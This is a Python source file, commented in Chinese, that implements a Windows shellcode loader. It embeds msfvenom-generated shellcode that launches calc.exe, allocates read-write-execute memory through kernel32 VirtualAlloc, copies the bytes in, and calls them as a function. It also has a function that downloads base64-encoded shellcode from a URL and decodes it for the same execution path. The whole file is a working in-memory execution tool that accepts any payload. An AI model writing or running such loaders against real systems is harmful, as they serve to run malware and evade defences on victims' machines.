import base64
import ctypes
import requests

kernel32 = ctypes.windll.kernel32


def get_code(url):
    with requests.get(url) as response:
        shellcode = base64.decodebytes(response.content)

    return shellcode


def local_shellcode():

    # msfvenom -p windows/x64/exec cmd=calc.exe -f python
    buf = b""
    buf += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41"
    buf += b"\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48"
    buf += b"\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"
    buf += b"\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c"
    buf += b"\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"
    buf += b"\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b"
    buf += b"\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0"
    buf += b"\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56"
    buf += b"\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9"
    buf += b"\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0"
    buf += b"\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58"
    buf += b"\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
    buf += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0"
    buf += b"\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
    buf += b"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
    buf += b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00"
    buf += b"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41"
    buf += b"\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41"
    buf += b"\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06"
    buf += b"\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
    buf += b"\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65"
    buf += b"\x78\x65\x00"

    return buf

def write_memory(buf):
    lenght = len(buf)

    # 默认情况下都会假定函数返回 C int 类型。
    # 其他返回类型可通过设置函数对象的 restype 属性来指定
    kernel32.VirtualAlloc.restype = ctypes.c_void_p

    # 参数类型可以使用 argtypes 来指定
    kernel32.RtlMoveMemory.argtypes = (ctypes.c_void_p,
                                       ctypes.c_void_p,
                                       ctypes.c_size_t)

    vaddress = kernel32.VirtualAlloc(None, lenght, 0x3000, 0x40)

    kernel32.RtlMoveMemory(vaddress, buf, lenght)

    return vaddress


def run(shellcode):
    # create_string_buffer()函数，它将以不同方式创建可变内存块
    buffer = ctypes.create_string_buffer(shellcode)
    vaddress = write_memory(buffer)

    # ctypes.cast(obj, type)此函数类似于 C 的强制转换运算符。
    # 它返回一个 type 的新实例，该实例指向与 obj 相同的内存块。
    # cast() 函数可以将一个指针实例强制转换为另一种 ctypes 类型。
    # cast() 接收两个参数，一个 ctypes 指针对象或者可以被转换为指针的其他类型对象，和一个 ctypes 指针类型。
    # 返回第二个类型的一个实例，该返回实例和第一个参数指向同一片内存空间。

    # ctypes.CFUNCTYPE(restype, *argtypes, use_errno=False, use_last_error=False)返回的函数原型会
    # 创建使用标准 C 调用约定的函数。
    # 将vaddress指针转换成函数指针
    shell_func = ctypes.cast(vaddress, ctypes.CFUNCTYPE(None))
    shell_func()


if __name__ == '__main__':
    # url = ''
    # shellcode = get_code(url)

    shellcode = local_shellcode()
    run(shellcode)




